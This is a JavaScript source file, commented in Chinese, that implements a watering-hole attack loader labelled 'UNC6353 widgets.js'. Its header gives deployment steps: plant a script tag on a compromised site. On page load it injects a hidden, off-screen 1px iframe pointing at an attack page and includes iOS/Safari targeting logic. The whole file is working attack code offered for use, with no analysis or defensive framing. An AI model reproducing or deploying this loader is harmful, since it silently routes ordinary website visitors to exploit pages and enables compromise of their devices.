/**
 * UNC6353 水坑攻击 - widgets.js
 * 
 * 功能：
 * - 被入侵网站植入的外部脚本
 * - 创建隐藏iframe加载攻击页面
 * - sandbox属性确保Safari兼容性
 * 
 * 使用方式：
 * 在目标网站植入：
 * <script async src="https://your-server/widgets.js?uid=xxx"></script>
 * 
 * 来源：iOS_Exploit_Code_Snippets.md 第191-219行
 */

(function () {
  'use strict';
  
  // 配置
  const CONFIG = {
    // 攻击服务器地址（部署时需要修改）
    attackServer: location.origin, // 默认使用当前域名
    attackPath: '/index.html',
    
    // iframe样式配置
    iframe: {
      width: '1px',
      height: '1px',
      border: '0',
      position: 'absolute',
      left: '-9999px',
      opacity: '0.01'
    },
    
    // sandbox权限（重要：Safari需要这些权限）
    sandbox: 'allow-scripts allow-same-origin',
    
    // 调试模式
    debug: false
  };
  
  // 日志函数
  function log(msg) {
    if (CONFIG.debug) {
      console.log('[UNC6353 Widgets]', msg);
    }
  }
  
  // 检查是否已经注入
  function isAlreadyInjected() {
    return document.querySelector('iframe[data-unc6353]') !== null;
  }
  
  // 创建攻击iframe
  function createAttackIframe() {
    try {
      log('Creating attack iframe...');
      
      const iframe = document.createElement('iframe');
      
      // 设置数据属性用于标记
      iframe.setAttribute('data-unc6353', 'true');
      
      // 设置src
      iframe.src = CONFIG.attackServer + CONFIG.attackPath;
      
      // 应用样式
      for (const [key, value] of Object.entries(CONFIG.iframe)) {
        iframe.style[key] = value;
      }
      
      // 设置sandbox属性（重要：Safari兼容性）
      iframe.setAttribute('sandbox', CONFIG.sandbox);
      
      // 设置其他属性
      iframe.setAttribute('loading', 'eager');
      iframe.setAttribute('importance', 'high');
      
      log('Iframe created, src: ' + iframe.src);
      
      return iframe;
    } catch (e) {
      log('Error creating iframe: ' + e.message);
      return null;
    }
  }
  
  // 注入iframe到页面
  function injectIframe() {
    try {
      // 检查是否已注入
      if (isAlreadyInjected()) {
        log('Already injected, skipping...');
        return false;
      }
      
      // 等待DOM ready
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', injectIframe);
        return false;
      }
      
      // 创建iframe
      const iframe = createAttackIframe();
      if (!iframe) {
        log('Failed to create iframe');
        return false;
      }
      
      // 注入到body
      if (document.body) {
        document.body.appendChild(iframe);
        log('Iframe injected successfully');
        return true;
      } else {
        log('document.body not available yet');
        setTimeout(injectIframe, 100);
        return false;
      }
    } catch (e) {
      log('Error injecting iframe: ' + e.message);
      return false;
    }
  }
  
  // 设备检测（可选：只针对iOS设备）
  function isTargetDevice() {
    const ua = navigator.userAgent;
    const isIOS = /iPhone|iPad|iPod/.test(ua);
    const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
    
    log('Device check - iOS: ' + isIOS + ', Safari: ' + isSafari);
    
    // 注释掉限制，允许所有设备（调试用）
    // return isIOS && isSafari;
    return true;
  }
  
  // 主执行函数
  function main() {
    log('UNC6353 widgets.js loaded');
    log('User-Agent: ' + navigator.userAgent);
    
    // 检查是否为目标设备
    if (!isTargetDevice()) {
      log('Not target device, skipping injection');
      return;
    }
    
    // 注入攻击iframe
    injectIframe();
  }
  
  // 启动
  try {
    main();
  } catch (e) {
    if (CONFIG.debug) {
      console.error('[UNC6353 Widgets] Fatal error:', e);
    }
  }
  
})();

// 防止多次加载
if (typeof window.__UNC6353_LOADED__ === 'undefined') {
  window.__UNC6353_LOADED__ = true;
}